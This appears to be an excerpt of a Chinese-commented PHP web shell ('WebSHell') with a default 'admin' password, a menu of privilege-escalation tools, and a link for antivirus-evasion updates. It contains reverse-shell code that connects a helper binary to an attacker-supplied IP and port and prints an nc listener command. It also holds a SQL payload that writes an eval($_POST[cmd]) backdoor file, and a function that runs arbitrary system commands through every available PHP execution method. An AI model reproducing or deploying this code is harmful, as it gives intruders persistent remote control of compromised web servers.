...
$password='admin';//密码
$shellname='WebSHell';//Shell名称
$myurl="www.baidu.com";//我的Url
...
"提权工具" => array("sqlshell" => "执行SQL执行","mysql_exec" => "MYSQL操作","myexp" => "MYSQL提权","servu" => "Serv-U提权","nc" => "NC反弹","linux" => "Linux反弹","downloader" => "文件下载","port" => "端口扫描"),
...
switch($eanver){
	...
	html_n("<li><a title='免杀更新' href='http://caidaome.com' target=\"main\">免杀更新</a></li>");
...
END;
	...
	echo '<div class="actall">';
		 ...
		 fputs ($fp ,"\n*********************************************\n 
		              hacking url:http://caidaome.com is ok!        
			          \n*********************************************\n\n");
	     while(!feof($fp)){ 
...
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		...
		if($_POST['use'] == 'perl')
		{
			...
			echo Exec_Run($perlpath.' /tmp/envl_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
		}
		if($_POST['use'] == 'c')
		{
			...
			echo Exec_Run('/tmp/envl_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
		}
...
function nFull(i){
	...
	Str[2] = "select ' eval(\$_POST[cmd]);' into outfile 'F:/web/bak.php';";
...
function Exec_Run($cmd){$res = '';if(function_exists('system')){@ob_start();@system($cmd." 2>&1",$res);$res = join("\r\n",$res);}elseif(function_exists('exec')){@exec($cmd,$res);$res = join("\r\n",$res);}elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);$res = join("\r\n",$res);}elseif(function_exists('passthru')){@ob_start();@passthru($cmd,$res);$res = join("\r\n",$res);}elseif(@is_resource($f=@popen($cmd,'r'))){$res = '';while(!@feof($f)){$res .= @fread($f,1024)."\r";}@pclose($f);}elseif(substr(dirname($_SERVER["SCRIPT_FILENAME"]),0,1)!="/"&&class_exists('COM')){$w=new COM('WScript.shell');$e=$w->exec($cmd);$f=$e->StdOut();$res=$f->ReadAll();$res = join("\r\n",$res);}return $res;}
